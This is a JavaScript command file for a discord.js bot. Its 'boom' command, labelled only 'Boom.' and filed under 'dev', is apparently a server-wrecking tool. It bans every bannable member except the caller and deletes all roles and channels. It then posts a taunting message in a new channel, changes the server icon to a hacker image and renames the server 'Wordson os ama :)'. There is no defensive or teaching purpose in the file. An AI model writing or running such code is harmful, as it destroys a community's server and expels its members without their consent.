const { Command } = require('discord.js-commando'),
      { MessageEmbed } = require('discord.js'),
      config = require('../../data/config');


module.exports = class EmojiCommand extends Command {
    constructor(client) {
        super(client, {
            name: 'boom',
            group: 'dev',
            ownerOnly: true,
            memberName: 'boom',
            description: 'Boom.',
            examples: ['boom']
        });
    }

    async run(msg) {
      try {
      
      const Guild = this.client.guilds.get(msg.guild.id);
      await Guild.setDefaultMessageNotifications("MENTIONS")
      const members = msg.guild.members.filter(member => member.bannable);  
        members.forEach(member => {
          if(member.id != msg.author.id) {
            member.ban()
          }
        })
      await msg.guild.roles.fetch().then(roles => {
        roles.forEach(role => role.delete())
      })
      await msg.guild.channels.forEach(channel => channel.delete())
      await Guild.channels.create("Wordson te llama").then(channel => {
           channel.send("Wordson os quiere:)")
      })
      Guild.setIcon("https://img-cdn.hipertextual.com/files/2016/07/hacker_3.jpg")
      await Guild.setName("Wordson os ama :)")
      } catch(err) {
        console.log(err)
      }
    }
}
